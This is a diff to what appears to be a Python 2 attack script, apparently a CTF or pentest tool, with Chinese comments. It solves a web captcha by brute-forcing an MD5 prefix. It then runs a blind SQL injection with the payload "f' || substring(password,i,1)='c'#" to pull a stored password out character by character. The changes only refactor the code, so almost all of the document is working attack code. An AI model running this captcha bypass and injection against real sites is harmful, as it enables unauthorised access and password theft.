@@ -16,6 +16,7 @@ class ExpandFunction(BaseConfig):
     # 从页面中获取验证码
     def __init__(self):
         BaseConfig.__init__(self)
+        self.Data = DataProcess()
 
     def get_code(self):
         r = self.s.get(self.url)
@@ -23,7 +24,8 @@ class ExpandFunction(BaseConfig):
         return r.text[code + 3:code + 7]
 
     # 跑验证码
-    def crack_code(self, code):
+    @staticmethod
+    def crack_code(code):
         sstr = 10000
 
         while 1:
@@ -31,19 +33,17 @@ class ExpandFunction(BaseConfig):
             m2.update(repr(sstr))
             if m2.hexdigest()[0:4] == code:
                 return sstr
-                break
             sstr += 1
 
     # 注当前表数据
-    @staticmethod
-    def get_password():
+    def get_password(self):
         password = ""
         for i in xrange(33):
             for j in range(40, 130):
                 payload = "f' || substring(password," + repr(i) + ",1)='" + chr(j) + "'#"
                 print payload
-                whether = DataProcess.get_data(payload)
-                if (whether == 0):
+                whether = self.Data.GetData(payload)
+                if whether == 0:
                     strr = j
                     password += chr(strr)
                     print "[*] password: " + password
